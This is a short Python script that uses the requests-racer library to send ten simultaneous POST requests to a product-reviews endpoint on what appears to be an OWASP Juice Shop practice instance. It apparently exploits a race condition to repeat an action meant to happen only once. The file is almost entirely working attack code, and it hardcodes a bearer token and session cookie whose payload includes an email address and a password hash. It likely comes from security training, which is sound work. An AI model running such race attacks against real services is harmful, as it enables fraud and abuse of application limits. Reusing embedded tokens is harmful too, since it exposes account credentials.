######### Setup:
# python3 -m venv env
# source env/bin/activate
# git clone https://github.com/nccgroup/requests-racer.git
# cd requests-racer
# python setup.py install

######### Code:
import requests
from requests_racer import SynchronizedAdapter

# Create a requests session
s = requests.Session()

# Create a synchronized adapter
sync = SynchronizedAdapter()

# Mount it to the session
s.mount('http://', sync)
s.mount('https://', sync)

# Define the URL
url = "http://gifton.juiceshop.ai.com:8000/rest/products/reviews"

headers = {
    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJiZW5AYXMuYWkiLCJwYXNzd29yZCI6IjAzNWMzOGI5NTc1MGFiNjhjYzc1NDRmM2Y4MjFlN2YxIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNS0wMi0xOSAwNTo0MTowNi43NjQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNS0wMi0xOSAwNTo0MTowNi43NjQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzM5OTQzNjgwfQ.Oy998YUbmTxKGO9eU7Tubdun5LPQyfzZkh8XvIxNzIih3AcbNWwG9phhr4eQbSBNGlAqiBiat_VB8g_By1svockconp6TfLvcD-xqi6izRaKU6-EfSvyOnFPOHJj7HpuYID5Vj-pk5JwC7E7nMW0GjU0BOo2efBv6c3FaqL4rt8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "http://gifton.juiceshop.ai.com:8000",
    "Referer": "http://gifton.juiceshop.ai.com:8000/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "Connection": "keep-alive",
    "Cookie": "welcomebanner_status=dismiss; cookieconsent_status=dismiss; language=en; continueCode=3whzt8i5fMSXtjc6CKFMfQSJTnKugNuxLhletN8IO6saRFYoUxKtgyIoXCzMfNrSDZuwPcXqCDQsn9f84fYJ; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJiZW5AYXMuYWkiLCJwYXNzd29yZCI6IjAzNWMzOGI5NTc1MGFiNjhjYzc1NDRmM2Y4MjFlN2YxIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNS0wMi0xOSAwNTo0MTowNi43NjQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNS0wMi0xOSAwNTo0MTowNi43NjQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzM5OTQzNjgwfQ.Oy998YUbmTxKGO9eU7Tubdun5LPQyfzZkh8XvIxNzIih3AcbNWwG9phhr4eQbSBNGlAqiBiat_VB8g_By1svockconp6TfLvcD-xqi6izRaKU6-EfSvyOnFPOHJj7HpuYID5Vj-pk5JwC7E7nMW0GjU0BOo2efBv6c3FaqL4rt8"
}
# JSON Payload
payload = {"id": "yntDwu2dEvDMJHhmp"}

# Create a list of request objects
requests_list = [
    s.post(url, headers=headers, json=payload) for _ in range(10)
]

# Ensure all requests complete
sync.finish_all()

# Print the responses
for i, response in enumerate(requests_list):
    print(f"Request {i+1}: {response.status_code} - {response.text}")
